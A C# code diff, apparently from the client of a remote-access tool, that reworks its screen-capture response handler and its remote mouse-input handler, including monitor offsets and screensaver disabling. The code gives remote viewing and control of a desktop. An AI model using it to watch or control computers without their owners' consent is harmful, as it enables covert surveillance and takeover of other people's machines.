@@ -62,21 +62,22 @@ namespace xClient.Core.Commands
             try
             {
                 desktop = ScreenHelper.CaptureScreen(command.Monitor);
-                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
-                    ImageLockMode.ReadWrite, desktop.PixelFormat);
+                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),ImageLockMode.ReadWrite, desktop.PixelFormat);
 
                 using (MemoryStream stream = new MemoryStream())
                 {
-                    if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
-                    StreamCodec.CodeImage(desktopData.Scan0,
-                        new Rectangle(0, 0, desktop.Width, desktop.Height),
+                    if (StreamCodec == null)
+                        throw new Exception("StreamCodec can not be null.");
+
+                    StreamCodec.CodeImage(desktopData.Scan0,new Rectangle(0, 0, desktop.Width, desktop.Height),
                         new Size(desktop.Width, desktop.Height),
                         desktop.PixelFormat, stream);
+
                     new Packets.ClientPackets.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
                         StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
                 }
             }
-            catch (Exception)
+            catch (Exception ex)
             {
                 if (StreamCodec != null)
                     new Packets.ClientPackets.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor,
@@ -107,47 +108,26 @@ namespace xClient.Core.Commands
         {
             try
             {
+                if (NativeMethodsHelper.IsScreensaverActive())
+                {
+                    NativeMethodsHelper.DisableScreensaver();
+                    return;
+                }
                 Screen[] allScreens = Screen.AllScreens;
-                int offsetX = allScreens[command.MonitorIndex].Bounds.X;
-                int offsetY = allScreens[command.MonitorIndex].Bounds.Y;
-                Point p = new Point(command.X + offsetX, command.Y + offsetY);
-
-                // Disable screensaver if active before input
-                switch (command.Action)
+                Rectangle rect = allScreens[command.MonitorIndex].Bounds;
+                if (rect.X != 0)
                 {
-                    case MouseAction.LeftDown:
-                    case MouseAction.LeftUp:
-                    case MouseAction.RightDown:
-                    case MouseAction.RightUp:
-                    case MouseAction.MoveCursor:
-                        if (NativeMethodsHelper.IsScreensaverActive())
-                            NativeMethodsHelper.DisableScreensaver();
-                        break;
+                    command.X += rect.X * 0xFFFF / rect.Width;
                 }
-
-                switch (command.Action)
+                if (rect.Y != 0)
                 {
-                    case MouseAction.LeftDown:
-                    case MouseAction.LeftUp:
-                        NativeMethodsHelper.DoMouseLeftClick(p, command.IsMouseDown);
-                        break;
-                    case MouseAction.RightDown:
-                    case MouseAction.RightUp:
-                        NativeMethodsHelper.DoMouseRightClick(p, command.IsMouseDown);
-                        break;
-                    case MouseAction.MoveCursor:
-                        NativeMethodsHelper.DoMouseMove(p);
-                        break;
-                    case MouseAction.ScrollDown:
-                        NativeMethodsHelper.DoMouseScroll(p, true);
-                        break;
-                    case MouseAction.ScrollUp:
-                        NativeMethodsHelper.DoMouseScroll(p, false);
-                        break;
+                    command.Y += rect.Y * 0xFFFF / rect.Height;
                 }
+                NativeMethodsHelper.OnMouseEventHander((uint)command.Action, command.X,command.Y, command.DwData);
             }
-            catch
+            catch(Exception )
             {
+
             }
         }
 
